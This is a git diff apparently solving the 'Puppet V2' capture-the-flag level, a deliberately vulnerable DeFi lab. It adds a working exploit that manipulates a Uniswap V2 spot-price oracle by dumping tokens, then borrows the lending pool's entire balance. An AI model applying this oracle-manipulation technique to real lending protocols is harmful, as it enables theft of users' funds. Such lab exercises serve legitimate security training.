@@ -103,6 +103,24 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        
+
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        uniswapV2Router.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, attacker, block.timestamp + 120 );
+        // attacker add : 0xEeE7e39fcB3333Dc595371A4303417DAE0c2c006
+        // weth attacker got : 9.900695134061569016 ether
+
+        // amount I need to borrow POOL_INITIAL_TOKEN_BALANCE : 29.496494833197321980
+
+        // convert the eth to weth
+        weth.deposit{value : 20 ether}();
+        // amount weth after converting ETH : 29.900695134061569016
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE );
 
         /**
          * EXPLOIT END *
@@ -121,3 +139,11 @@ contract PuppetV2 is Test {
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
 }
+
+
+/* 
+1. Dump the price in uniswap v2 by depositing 10 000DVTs to get eth
+2. Use all ETH I got to buy DVTs
+
+
+*/
